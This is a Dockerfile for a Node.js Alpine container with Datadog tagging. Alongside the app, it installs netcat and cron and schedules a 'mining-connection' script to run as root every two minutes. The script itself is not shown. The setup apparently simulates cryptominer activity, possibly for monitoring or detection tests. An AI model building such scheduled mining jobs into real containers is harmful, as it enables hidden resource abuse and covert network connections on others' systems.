FROM node:18-alpine

# Datadog git tracking
ARG DD_GIT_REPOSITORY_URL
ARG DD_GIT_COMMIT_SHA
ENV DD_GIT_REPOSITORY_URL=${DD_GIT_REPOSITORY_URL}
ENV DD_GIT_COMMIT_SHA=${DD_GIT_COMMIT_SHA}

# Install system utilities (including crond for scheduled tasks and netcat for network connections)
RUN apk add --no-cache \
    dcron \
    netcat-openbsd \
    bind-tools \
    procps

# Set working directory
WORKDIR /app

# Copy package files
COPY package*.json ./

# Install dependencies
RUN npm install --production

# Copy application files
COPY . .

# Create directory for Datadog and logs
RUN mkdir -p /etc/datadog /var/log

# Copy mining connection script and make it executable
COPY mining-connection.sh /app/mining-connection.sh
RUN chmod +x /app/mining-connection.sh

# Setup cron job for mining connections (every 2 minutes)
COPY mining-crontab /etc/crontabs/root
RUN touch /var/log/mining-connections.log /var/log/cron.log

# Expose port
EXPOSE 3000

# Health check
HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \
  CMD node -e "require('http').get('http://localhost:3000/health', (r) => {process.exit(r.statusCode === 200 ? 0 : 1)})"

# Create startup script to run both cron and the application
RUN echo '#!/bin/sh' > /app/start.sh && \
    echo 'crond -f -l 2 &' >> /app/start.sh && \
    echo 'echo "Cron daemon started - Mining connections scheduled every 2 minutes"' >> /app/start.sh && \
    echo 'npm start' >> /app/start.sh && \
    chmod +x /app/start.sh

# Start application with cron
CMD ["/app/start.sh"]
